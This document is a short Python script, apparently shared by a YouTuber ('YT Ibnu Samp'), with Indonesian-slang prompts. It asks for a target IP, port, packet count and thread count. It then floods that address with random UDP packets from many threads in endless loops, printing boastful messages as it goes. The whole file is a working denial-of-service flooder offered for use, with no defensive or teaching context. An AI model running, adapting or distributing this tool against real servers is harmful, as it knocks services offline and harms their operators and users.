import random

import socket

import threading

import os,sys



os.system("clear")

print('''

YT Ibnu Samp
10k Minat?
''')

ip = str(input("IP  mamank >>> :"))

port = int(input("Port  mamank >>> :"))

choice = str(input("mulai? (y/n) >>> :"))

times = int(input("Packet  ini mank>>> :"))

threads = int(input("Threads  >>> :"))



os.system("clear")

def run():

	data = random._urandom(1490)

	i = random.choice(("[•]","[•]","[•]"))

	while True:

		try:

			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

			addr = (str(ip),int(port))

			for x in range(times):

				s.sendto(data,addr)

			print(i +"Ibnu Samp Datang !!!")

		except:

			print("[X] Yah Jebol !!!")



def run2():

	data = random._urandom(16)

	i = random.choice(("[•]","[•]","[•]"))

	while True:

		try:

			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

			s.connect((ip,port))

			s.send(data)

			for x in range(times):

				s.send(data)

			print(i +"Ibnu Samp Datang !!!")

		except:

			s.close()

			print("[X] Yah Jebol !!!")



def run3():

	data = random._urandom(16)

	i = random.choice(("[•]","[•]","[•]"))

	while True:

		try:

			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

			s.connect((ip,port))

			s.send(data)

			for x in range(times):

				s.send(data)

			print(i +"Ibnu Samp Datang !!!")

		except:

			s.close()

			print("[X] Yah Jebol !!!")



for y in range(threads):

	if choice == 'y':

		th = threading.Thread(target = run)

		th.start()

		th = threading.Thread(target = run2)

		th.start()

	else:

		th = threading.Thread(target = run3)

		th.start()